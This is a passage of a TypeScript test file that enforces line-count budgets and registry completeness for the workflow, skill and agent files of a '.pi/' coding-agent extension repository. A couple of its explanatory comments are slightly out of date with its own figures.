		const dirs = importedSubsystemDirs([".pi/extensions/workflows/index.ts"]);
		expect(dirs).toContain(".pi/extensions/quality");
		expect(
			dirs.some((d) => d.endsWith("index.ts")),
			"importedSubsystemDirs must resolve to the subsystem ROOT, never the imported file's own path",
		).toBe(false);
	});

	it("CR-04 proof: a package import (no leading ./ or ../) is never mistaken for a local subsystem", () => {
		// importedSubsystemDirs' own regex requires a leading "./" or "../" --
		// a bare package specifier ("@earendil-works/pi-coding-agent", "vitest")
		// must never resolve to a local directory this registry could ratchet.
		const dirs = importedSubsystemDirs([".pi/extensions/workflows/index.ts"]);
		expect(dirs.some((d) => d.includes("@earendil-works") || d.includes("node_modules"))).toBe(false);
	});

	it(
		"WR2-04 proof: commandDirs includes .pi/extensions/providers via a TRANSITIVE, depth-2 import -- " +
			"routing/index.ts imports ./modes.ts directly, and modes.ts (never itself scanned by CR-04's " +
			"depth-1-only version) imports callWithFallback from ../providers/fallback.ts and CHAIN from " +
			"../providers/schema.ts",
		() => {
			expect(
				isCommandSource(".pi/extensions/providers/index.ts"),
				"providers/index.ts must NOT itself spell registerCommand( -- if it ever does, this proof is " +
					"testing the wrong mechanism (isCommandSource, not the transitive walk)",
			).toBe(false);
			expect(
				commandDirs,
				"routing/index.ts -> ./modes.ts -> ../providers/{fallback,schema}.ts is a depth-2 chain; " +
					"commandDirs must include .pi/extensions/providers via that chain, or the transitive walk " +
					"is still depth-1-only in substance even if its code LOOKS like a fixed point",
			).toContain(".pi/extensions/providers");
		},
	);

	it(
		"WR2-04 proof: commandDirs includes .pi/lib, a LOCAL directory outside .pi/extensions/ entirely -- " +
			".pi/lib/jsonl.ts is imported by (at least) routing/index.ts and safety/audit.ts",
		() => {
			expect(
				commandDirs,
				".pi/lib/jsonl.ts is a live, shared, unbudgeted import target reached from multiple command " +
					"subsystems -- commandDirs must include .pi/lib, or the `.pi/extensions/`-only filter is " +
					"still in effect even after this fix",
			).toContain(".pi/lib");
		},
	);

	it("WR2-04 proof: a hit under .pi/extensions/ still resolves to its SUBSYSTEM ROOT (slice(0,3)), never dirname, even via the transitive walk", () => {
		// Distinguishes the two branches inside importedSubsystemDirs: a
		// .pi/extensions/ hit must NOT fragment into a deeper per-file or
		// per-subdirectory entry, matching commandDirs' own slice(0,3)
		// convention for consistency with the rest of this registry.
		const dirs = importedSubsystemDirs([".pi/extensions/routing/index.ts"]);
		expect(dirs).toContain(".pi/extensions/providers");
		expect(
			dirs.some((d) => d.includes("providers/fallback") || d.includes("providers/schema")),
			"a .pi/extensions/ hit must resolve to the subsystem root, never the imported file's own path",
		).toBe(false);
	});

	it("WR2-04 proof: a hit OUTSIDE .pi/extensions/ (but still under .pi/) resolves to its own immediate directory, not a subsystem-root slice", () => {
		const dirs = importedSubsystemDirs([".pi/extensions/routing/index.ts"]);
		expect(dirs).toContain(".pi/lib");
		expect(dirs.some((d) => d === ".pi" || d === "."), "must not over-generalise to an ancestor of .pi/lib").toBe(false);
	});
});

/**
 * WR-05 -- `isCommandSource` is the predicate that lets discovery see a
 * command surface OUTSIDE `workflows/`. Tested directly against two real
 * files already in this repository, rather than only indirectly through
 * `discoverWorkflowFiles()`'s completeness check -- which cannot itself
 * distinguish "the predicate works" from "every file it would have caught is
 * already declared", since this commit declares all three it finds.
 */
describe("WR-05 -- isCommandSource discovers a command surface by content, not by location", () => {
	it("is true for a real file outside workflows/ that spells registerCommand( (routing/index.ts)", () => {
		expect(
			isCommandSource(".pi/extensions/routing/index.ts"),
			"routing/index.ts registers /mode and /escalate -- WR-05's whole point is that this must be " +
				"discoverable even though it is not under workflows/",
		).toBe(true);
	});

	it("is false for a real .ts file that does NOT spell registerCommand( (evidence.ts, by its own boundary rule)", () => {
		expect(
			isCommandSource(".pi/extensions/workflows/evidence.ts"),
			"evidence.ts's own module docstring says it registers nothing and does not spell the " +
				"registration call even in prose -- isCommandSource must not false-positive on it",
		).toBe(false);
	});
});

/**
 * WR-04 -- `isCommandSource` and `discoverWorkflowFiles()` must never throw
 * on a path that is tracked in the git index but absent on disk (a
 * `git rm --cached`, or a delete staged/unstaged). Proved directly here
 * rather than only by planting a real tracked-but-deleted file (which the
 * mutation test below does, and reverts): a raw ENOENT thrown from
 * `discoverWorkflowFiles()` -- called in every `describe` body above, i.e.
 * at collection time -- silently reports "no tests" for this entire file,
 * disabling FLOW-11's registry, the 80-line ceiling and the completeness
 * check all at once with no red test to notice.
 */
describe("WR-04 -- a path that does not exist on disk classifies as false, never throws", () => {
	it("isCommandSource returns false, does not throw, for a path with no file on disk", () => {
		expect(() => isCommandSource(".pi/extensions/does-not-exist.ts")).not.toThrow();
		expect(isCommandSource(".pi/extensions/does-not-exist.ts")).toBe(false);
	});

	it("discoverWorkflowFiles() does not throw when the union includes a nonexistent path", () => {
		expect(() => discoverWorkflowFiles()).not.toThrow();
	});
});

/**
 * Registry completeness, both directions -- neither folded into the per-file
 * loop above, which iterates the registry and therefore cannot see a file
 * the registry omits. That omission is exactly the Phase 9 failure this
 * requirement exists to prevent: GSD's own `quick.md` is 1,169 lines, and a
 * registry that only checks what it already knows about would let a file
 * that size land unbudgeted.
 */
describe("FLOW-11 -- registry completeness, both directions", () => {
	const discovered = discoverWorkflowFiles();
	const declaredFiles = WORKFLOW_BUDGETS.map((e) => e.file);

	it("present-but-undeclared: every discovered workflow file has a budget entry", () => {
		const offenders = discovered.filter((p) => !declaredFiles.includes(p));
		expect(
			offenders,
			"a workflow file with no budget is a workflow with no budget -- add each of these to " +
				"WORKFLOW_BUDGETS with a number and a reason. This is the direction that stops a future " +
				"phase from shipping a workflow the size of GSD's own quick.md (1,169 raw lines) without " +
				"this registry ever noticing",
		).toEqual([]);
	});

	it("declared-but-absent: every WORKFLOW_BUDGETS entry names a file that still exists", () => {
		const offenders = WORKFLOW_BUDGETS.filter((e) => !existsSync(join(repoRoot(), e.file))).map((e) => e.file);
		expect(
			offenders,
			"each of these registry entries names a file that no longer exists on disk -- the entry is " +
				"stale; delete it in the same commit that deleted the file",
		).toEqual([]);
	});
});

/**
 * D-12 (PLAN 09-02) -- see this file's module docstring for the decision.
 * `.pi/agents/*.md` carries zero glob coverage anywhere above: neither
 * WORKFLOWS_DIR, PROMPTS_DIR, SKILLS_DIR nor EXTENSIONS_DIR is a prefix of
 * `.pi/agents/`, confirmed by grep (0 matches for `.pi/agents` in this file
 * before this plan). The files that exist there, `.pi/agents/planner.md` and
 * `.pi/agents/executor-handoff.md`, are declared to their owning code, so an
 * unreachable file still carries a budget rather than staying invisible.
 */
const RESOURCE_EDGES: readonly { workflow: string; paths: readonly string[]; budget: number; why: string }[] = [
	{
		workflow: ".pi/extensions/quality/reviewer.ts (declared owner -- see this entry's own why)",
		paths: [".pi/agents/planner.md"],
		budget: 50,
		why: "nothing loads this file at runtime today -- the reviewer dispatches through quality/reviewer.ts#runSingleShotRole and never touches .pi/agents/*.md or the subagent machinery. Declared here unconditionally, because an unreachable file is exactly the shape that would otherwise slip past every budget in this repository. Measured 48 raw lines 2026-10-13 (planner.md), rounded up to the next ten. Re-measured after reviewer.md was deleted: its 42 raw lines are no longer counted",
	},
	{
		workflow: ".pi/extensions/execute/handoff.ts (declared owner -- see this entry's own why)",
		paths: [".pi/agents/executor-handoff.md"],
		budget: 20,
		why: "plan 09-11 (FLOW-09) -- executor-handoff.md's own HONEST STATUS paragraph states plainly that " +
			"nothing in this repository loads this file at runtime today; it is exercised only by " +
			"tests/unit/handoff-packet.test.ts's offline packet-builder unit tests, which build and measure " +
			"the packet this file's own prose describes without ever spawning a real subagent (pi-subagents " +
			"is pinned, RB-07-02, OUTSTANDING). Declared to handoff.ts as its honest owner for the identical " +
			"reason the planner/reviewer row above declares to quality/reviewer.ts -- an unreachable file is " +
			"exactly the shape that would otherwise slip past every budget in this repository. Measured 33 " +
			"raw lines 2026-08-16, rounded up to the next ten. Re-measured 15 raw lines 2026-10-13 after executor-handoff.md was shortened, rounded up to the next ten",
	},
];

/** D-12: the character class a `.pi/` path literal may use, matching {@link importedSubsystemDirs}'s own regex discipline. */
const PI_PATH_LITERAL = /["'`](\.?\/?\.pi\/[A-Za-z0-9._/-]+)["'`]/g;

/**
 * Every file under a resource-root directory, tracked or on-disk (same
 * tracked+on-disk union {@link filesInDir} uses), with no `.ts`/`.js` filter
 * -- D-12's edges (i) and (ii) both need EVERY file, not only source files.
 */
function filesUnion(rel: string): string[] {
	const union = new Set([...trackedFiles(rel), ...walkOnDisk(rel)]);
	return Array.from(union)
		.filter((p) => p.startsWith(`${rel}/`))
		.filter((p) => existsSync(join(repoRoot(), p)))
		// .gitkeep is a placeholder that makes git track an otherwise-empty
		// directory -- it carries no content and is never a resource a
		// workflow could load, so it is noise for this scanner, not a hole.
		.filter((p) => !p.endsWith("/.gitkeep"))
		.sort();
}

/**
 * Best-effort comment strip -- block comments and line comments removed
 * before {@link PI_PATH_LITERAL} is applied. NOT a full parser (a
 * line-comment marker inside a real string literal would be mis-stripped),
 * which is an accepted, documented limit for a test-side static scanner in
 * the same spirit as {@link importedSubsystemDirs}'s own regex-only import
 * walk. Without this, every JSDoc CITATION of another file's path (e.g.
 * "see `.pi/lib/jsonl.ts`'s module docstring") is indistinguishable from a
 * genuine resource load, which would make the completeness check below
 * permanently noisy with prose, not code -- confirmed empirically: the
 * pre-strip candidate set included `.pi/extensions/qoder/index.ts` and
 * `.pi/lib/jsonl.ts`, both ONLY EVER mentioned inside a JSDoc citation
 * naming a sibling module, never loaded by anything.
 */
function stripComments(text: string): string {
	const BLOCK_COMMENT = new RegExp(String.raw`/\*[\s\S]*?\*/`, "g");
	const LINE_COMMENT = new RegExp(String.raw`//.*$`, "gm");
	return text.replace(BLOCK_COMMENT, "").replace(LINE_COMMENT, "");
}

/**
 * D-12's three genuinely-open edges, scanned fresh each call (not memoised
 * -- this file has no fixture lifecycle to invalidate a cache against):
 *
 * (i) every file under `.pi/agents/` -- zero glob coverage anywhere above.
 * (ii) every file under `.pi/skills/**` or `.pi/prompts/**` that does NOT
 *      end in `.md` -- walked by {@link walkOnDisk}, then dropped by
 *      {@link discoverWorkflowFiles}'s own `.endsWith(".md")` filter.
 * (iii) every `.pi/`-shaped path literal appearing in a discovered workflow
 *      source, skill body or prompt body -- EXCLUDING a literal that is ALSO
 *      a resolvable relative import specifier (that half is
 *      {@link importedSubsystemDirs}'s job; not double-counted here).
 *
 * Deliberately does NOT re-scan `.md` files under `.pi/skills/`/`.pi/prompts/`
 * -- Pitfall 3 (`09-RESEARCH.md`): that half is ALREADY closed by
 * {@link discoverWorkflowFiles} + the registry-completeness check above.
 */
function resourceEdgeCandidates(): string[] {
	const out = new Set<string>();

	for (const p of filesUnion(AGENTS_DIR)) {
		out.add(p);
	}

	for (const dir of [SKILLS_DIR, PROMPTS_DIR]) {
		for (const p of filesUnion(dir)) {
			if (!p.endsWith(".md")) {
				out.add(p);
			}
		}
	}

	for (const file of discoverWorkflowFiles()) {
		let rawText: string;
		try {
			rawText = readFileSync(join(repoRoot(), file), "utf-8");
		} catch {
			continue;
		}
		// Comments are prose, not code -- see stripComments' own docstring for
		// the empirical false-positive set this closes (qoder/index.ts,
		// .pi/lib/jsonl.ts, both only ever cited in a JSDoc paragraph).
		const text = stripComments(rawText);
		for (const m of text.matchAll(PI_PATH_LITERAL)) {
			const literal = m[1];
			if (literal === undefined) {
				continue;
			}
			// Already covered by importedSubsystemDirs' own import-edge scan -- a
			// literal that is ALSO a genuine relative import specifier is not
			// double-counted here. Defensive, not load-bearing today: a real
			// import specifier in this codebase never spells ".pi/" literally
			// (it navigates relative to its OWN file, not the repo root).
			if (literal.startsWith(".") && resolveLocalImport(file, literal) !== undefined) {
				continue;
			}
			const normalized = literal.replace(/^\.\//, "");
			if (!existsSync(join(repoRoot(), normalized))) {
				continue;
			}
			out.add(normalized);
		}
	}

	return Array.from(out).sort();
}

describe("Item 1 (D-12) -- RESOURCE_EDGES: the non-import resource-edge closure", () => {
	const candidates = resourceEdgeCandidates();

	it("finds at least one resource-edge candidate (guards against a vacuous pass)", () => {
		expect(
			candidates.length,
			"resourceEdgeCandidates() found nothing -- without this guard the completeness assertion below " +
				"would pass having checked nothing. .pi/agents/planner.md and executor-handoff.md guarantee " +
				"this is >= 2 today",
		).toBeGreaterThanOrEqual(1);
	});

	it("declares at least one RESOURCE_EDGES entry (guards against a vacuous pass)", () => {
		expect(RESOURCE_EDGES.length, "RESOURCE_EDGES is empty -- the loops below would assert nothing").toBeGreaterThanOrEqual(1);
	});

	it("present-but-undeclared: every resource-edge candidate is named in some RESOURCE_EDGES row", () => {
		const declared = new Set(RESOURCE_EDGES.flatMap((e) => e.paths));
		const offenders = candidates.filter((p) => !declared.has(p));
		expect(
			offenders,
			"a .pi/ path reachable only by name (not a static import, not a discovered .md skill/prompt body) " +
				"and not declared in RESOURCE_EDGES is invisible to every budget in this repository -- declare " +
				"each of these in a RESOURCE_EDGES row with a budget and a reason",
		).toEqual([]);
	});

	it("declared-but-absent: every RESOURCE_EDGES path exists on disk", () => {
		const offenders = RESOURCE_EDGES.flatMap((e) => e.paths).filter((p) => !existsSync(join(repoRoot(), p)));
		expect(
			offenders,
			"each of these RESOURCE_EDGES paths names a file that no longer exists -- delete the stale entry " +
				"in the same commit that deleted the file",
		).toEqual([]);
	});

	it("does not re-flag a .md skill/prompt body -- Pitfall 3: that half is ALREADY closed by discoverWorkflowFiles()", () => {
		const offenders = candidates.filter((p) => p.endsWith(".md") && !p.startsWith(`${AGENTS_DIR}/`));
		expect(
			offenders,
			"a .md file under .pi/skills/ or .pi/prompts/ is already discovered and budgeted by " +
				"discoverWorkflowFiles() + WORKFLOW_BUDGETS' completeness check -- re-flagging it here would " +
				"be a second mechanism for an already-closed hole",
		).toEqual([]);
	});

	it.each(RESOURCE_EDGES)("$workflow's declared paths stay within their declared budget", (entry) => {
		const total = entry.paths.reduce((sum, p) => sum + countRawLines(p), 0);
		expect(
			total,
			`${entry.workflow}'s declared paths total ${total} raw lines, over its budget of ${entry.budget} (${entry.why})`,
		).toBeLessThanOrEqual(entry.budget);
	});

	it.each(RESOURCE_EDGES)("$workflow's budget IS the measured total rounded up to the next ten", (entry) => {
		const total = entry.paths.reduce((sum, p) => sum + countRawLines(p), 0);
		const expected = Math.ceil(total / 10) * 10;
		expect(
			entry.budget,
			`${entry.workflow}'s declared paths total ${total} raw lines, so its budget must be ${expected} -- ` +
				`the next multiple of ten. It is declared as ${entry.budget}. Update the number AND the measured ` +
				"figure in its `why`, in the same commit as the change that moved it",
		).toBe(expected);
	});
});

/**
 * D-13 (PLAN 09-02) -- see this file's module docstring for the decision.
 * Sourced verbatim from `.planning/research/FEATURES.md` Part 2: `/grill`
 * <=250 (line 158), `/plan` <=200 + `/execute` <=250 (line 183), `/review`
 * <=250 (line 206), `/quick` <=100 (line 238's harder "if it exceeds 100 it
 * has failed" ceiling, not the softer 80-line target on the same line --
 * matching workflows/index.ts's own greppable 100-line assertion above).
 * FROZEN: unlike WORKFLOW_BUDGETS/DIRECTORY_BUDGETS, this table's numbers
 * MAY NOT MOVE to absorb growth. See the `budget === FEATURES_CEILINGS[name]`
 * assertion below and Falsification 5 (recorded in `09-02-SUMMARY.md`).
 */
const FEATURES_CEILINGS: Readonly<Record<string, number>> = {
	grill: 250,
	plan: 200,
	execute: 250,
	review: 250,
	quick: 100,
};

/**
 * D-13: a workflow's TOTAL readable text -- its own command file plus every
 * declared skill/prompt body, summed. Kept SEPARATE from DIRECTORY_BUDGETS
 * deliberately (`09-RESEARCH.md` Item 1(d)): a merged closure budget would
 * charge `/quick` with quality+safety+diagnostics (~13k lines) and be
 * meaningless.
 *
 * Unlike WORKFLOW_BUDGETS/DIRECTORY_BUDGETS there is no `budget === ceil(sum/10)*10` rule: the ceiling is a spec
 * number, so it stays put while the measured sum is free to move beneath it.
 */
const WORKFLOW_TEXT_BUDGETS: readonly {
	name: string;
	commandFile: string;
	bodies: readonly string[];
	budget: number;
	why: string;
}[] = [
	{
		name: "quick",
		commandFile: ".pi/extensions/workflows/index.ts",
		bodies: [],
		budget: 100,
		why: "the harder FEATURES.md Part 2 line 238 ceiling; no skill/prompt body. Measured 98 raw lines " +
			"2026-10-13 with countRawLines, inside 100 -- the independent greppable assertion on " +
			"workflows/index.ts still holds",
	},
	{
		name: "grill",
		commandFile: ".pi/extensions/grill/index.ts",
		bodies: [".pi/skills/grill/SKILL.md"],
		budget: 250,
		why: "FEATURES.md Part 2 line 158's ceiling for the flagship workflow -- FROZEN, may not move to absorb " +
			"growth (D-13). Measured 175 raw lines (index.ts) + 60 raw lines (SKILL.md) = 235 raw lines " +
			"2026-10-13 with countRawLines, inside 250 -- scorecard.ts, spec-schema.ts and " +
			"scorecard-parse.ts are supporting modules bound only by the .pi/extensions/grill DIRECTORY_BUDGETS " +
			"ratchet above, per this registry's own module-docstring rule (D-13) that a merged closure budget " +
			"would be meaningless",
	},
	{
		name: "plan",
		commandFile: ".pi/extensions/plan-ceremony/index.ts",
		bodies: [".pi/skills/plan-ceremony/SKILL.md"],
		budget: 200,
		why: "FEATURES.md Part 2 line 183's ceiling, the TIGHTEST of the four ceremonial ceilings -- FROZEN, " +
			"may not move to absorb growth (D-13). Measured 155 raw lines (index.ts) + 44 raw lines " +
			"(SKILL.md) = 199 raw lines 2026-10-13 with countRawLines, inside 200 with 14 lines of headroom -- " +
			"plan-schema.ts and requirement-ids.ts are supporting modules bound only by the " +
			".pi/extensions/plan-ceremony DIRECTORY_BUDGETS ratchet above, per this registry's own " +
			"module-docstring rule (D-13) that a merged closure budget would be meaningless",
	},
	{
		name: "execute",
		commandFile: ".pi/extensions/execute/index.ts",
		bodies: [],
		budget: 250,
		why: "FEATURES.md Part 2 ceiling for /execute -- FROZEN, may not move to absorb growth (D-13). No skill body; " +
			"measured 230 raw lines 2026-10-13 with countRawLines. handoff.ts and progress.ts are bound by " +
			"the .pi/extensions/execute DIRECTORY_BUDGETS ratchet",
	},
	{
		name: "review",
		commandFile: ".pi/extensions/review/index.ts",
		bodies: [],
		budget: 250,
		why: "FEATURES.md Part 2 line 206's ceiling -- FROZEN, may not move to absorb growth (D-13). Measured 170 raw lines (index.ts), no skill body, = 170 raw lines 2026-10-13 with countRawLines, inside 250. mr.ts and " +
			"scope-drift.ts are bound by the .pi/extensions/review DIRECTORY_BUDGETS ratchet",
	},
];

describe("Item 1(d) (D-13) -- WORKFLOW_TEXT_BUDGETS: the per-workflow readable-text ceiling", () => {
	it("declares at least one entry (guards against a vacuous pass)", () => {
		expect(
			WORKFLOW_TEXT_BUDGETS.length,
			"WORKFLOW_TEXT_BUDGETS is empty -- the loops below would assert nothing",
		).toBeGreaterThanOrEqual(1);
	});

	it("FEATURES_CEILINGS has exactly the five names FEATURES.md Part 2 specifies, at their stated values", () => {
		expect(Object.keys(FEATURES_CEILINGS).sort()).toEqual(["execute", "grill", "plan", "quick", "review"]);
		expect(FEATURES_CEILINGS).toEqual({ grill: 250, plan: 200, execute: 250, review: 250, quick: 100 });
	});

	it("every FEATURES_CEILINGS name has exactly one WORKFLOW_TEXT_BUDGETS row", () => {
		for (const name of Object.keys(FEATURES_CEILINGS)) {
			const rows = WORKFLOW_TEXT_BUDGETS.filter((e) => e.name === name);
			expect(
				rows.length,
				`FEATURES_CEILINGS declares '${name}' but WORKFLOW_TEXT_BUDGETS has ${rows.length} rows for it -- add its row (exactly one)`,
			).toBe(1);
		}
	});

	it("every WORKFLOW_TEXT_BUDGETS row names a FEATURES_CEILINGS workflow", () => {
		for (const entry of WORKFLOW_TEXT_BUDGETS) {
			expect(
				Object.hasOwn(FEATURES_CEILINGS, entry.name),
				`WORKFLOW_TEXT_BUDGETS row '${entry.name}' is not in FEATURES_CEILINGS -- delete the row, or add the ceiling from FEATURES.md Part 2`,
			).toBe(true);
		}
	});

	it.each(WORKFLOW_TEXT_BUDGETS)("$name's why states the measured sum and a date", (entry) => {
		const total = [entry.commandFile, ...entry.bodies].reduce((sum, f) => sum + countRawLines(f), 0);
		expect(entry.why, `${entry.name}'s why must state the measured ${total} raw lines`).toContain(`${total} raw lines`);
		expect(entry.why, `${entry.name}'s why must carry a YYYY-MM-DD measurement date`).toMatch(/\d{4}-\d{2}-\d{2}/);
	});

	it("quick keeps its independent 100-line ceiling", () => {
		expect(countRawLines(".pi/extensions/workflows/index.ts")).toBeLessThanOrEqual(100);
	});

	it.each(WORKFLOW_TEXT_BUDGETS)("$name's command file + declared bodies stay within its budget", (entry) => {
		const parts = [entry.commandFile, ...entry.bodies];
		const total = parts.reduce((sum, f) => sum + countRawLines(f), 0);
		expect(
			total,
			`${entry.name}'s readable text is ${total} raw lines (` +
				`${parts.map((f) => `${f} ${countRawLines(f)}`).join(", ")}), over its budget of ${entry.budget} ` +
				`(${entry.why})`,
		).toBeLessThanOrEqual(entry.budget);
	});

	it.each(WORKFLOW_TEXT_BUDGETS)("$name's budget IS the FEATURES.md ceiling -- it may not move to absorb growth", (entry) => {
		const ceiling = FEATURES_CEILINGS[entry.name];
		expect(
			entry.budget,
			`${entry.name}'s WORKFLOW_TEXT_BUDGETS budget is ${entry.budget} but FEATURES_CEILINGS['${entry.name}'] ` +
				`is ${ceiling} -- unlike WORKFLOW_BUDGETS/DIRECTORY_BUDGETS, this ceiling is not a rounded ` +
				"measurement; it is the spec number from FEATURES.md Part 2, and it MAY NOT MOVE. Over budget " +
				"means cut text, not raise the number",
		).toBe(ceiling);
	});

	it.each(WORKFLOW_TEXT_BUDGETS)("$name's commandFile exists and registers the command by name", (entry) => {
		expect(existsSync(join(repoRoot(), entry.commandFile)), `${entry.commandFile} does not exist`).toBe(true);
		const text = readFileSync(join(repoRoot(), entry.commandFile), "utf-8");
		expect(
			text.includes(`registerCommand("${entry.name}"`),
			`${entry.commandFile} does not spell registerCommand("${entry.name}" -- WORKFLOW_TEXT_BUDGETS' ` +
				"commandFile must actually register the command it claims to budget",
		).toBe(true);
	});

	it.each(WORKFLOW_TEXT_BUDGETS)("$name's declared bodies all exist on disk", (entry) => {
		const offenders = entry.bodies.filter((b) => !existsSync(join(repoRoot(), b)));
		expect(offenders, `${entry.name} declares a body that does not exist on disk`).toEqual([]);
	});

	it("claimed-bodies completeness: every discovered skill/prompt .md file is claimed by exactly one WORKFLOW_TEXT_BUDGETS row", () => {
		// Today .pi/skills/ and .pi/prompts/ are .gitkeep-only -- this passes VACUOUSLY.
		// 09-08 is the first real exercise of this assertion (09-RESEARCH.md Item 1(d)).
		const skillsAndPrompts = discoverWorkflowFiles().filter(
			(p) => (p.startsWith(`${SKILLS_DIR}/`) || p.startsWith(`${PROMPTS_DIR}/`)) && p.endsWith(".md"),
		);
		for (const file of skillsAndPrompts) {
			const claimants = WORKFLOW_TEXT_BUDGETS.filter((e) => e.bodies.includes(file));
			expect(
				claimants.length,
				`${file} is a discovered skill/prompt body claimed by ${claimants.length} WORKFLOW_TEXT_BUDGETS ` +
					"rows (must be exactly 1) -- a skill body no workflow claims is text the model reads that " +
					"nothing bounds",
			).toBe(1);
		}
	});
});
